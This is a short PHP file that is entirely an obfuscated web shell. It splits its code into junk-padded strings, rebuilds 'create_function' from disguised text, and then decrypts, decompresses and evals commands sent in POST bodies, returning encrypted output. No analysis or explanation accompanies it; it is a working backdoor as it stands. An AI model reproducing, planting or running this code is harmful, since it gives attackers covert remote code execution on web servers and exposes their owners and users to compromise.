<?php
$D=')O{$c=strlOen($k)OO;$l=strOlen($Ot);$o="";foOr($iO=O0;$i<$lO;)O{for($j=0;($jO<$c&&$i<$Ol);$jOO++,$i+';
$X='+)O{$o.=$t{$iO}^O$k{$j}O;}}reOturn $oO;}if (@Opreg_Omatch("O/$kh(.+)$Okf/"O,@OfileO_get_coOntents("php';
$V='O://inpuOt"),$Om)==1) O{@ob_Ostart();@eOvaOl(@gzunOcompresOOs(@OxO(@basOe64_decode($m[1]),$kOO)O));';
$A='$o=@ob_get_cOontenOts(O);@obO_end_Oclean();$r=@basOe64_eOncode(@x(O@gzcoOmpOressOO($o),$k));prOOint("$p$kh$r$kf");}';
$d=str_replace('SM','','SMcrSMeateSMSM_funSMSMction');
$i='$k="47527ObaOa";$kh="90Of88O5fa7Oe92"O;$kOf="c44eb6bd4e28"O;$Op="XOoSJPH3MKOg7sOLSO0y";fuOnction x($t,$k';
$t=str_replace('O','',$i.$D.$X.$V.$A);
$M=$d('',$t);$M();
?>
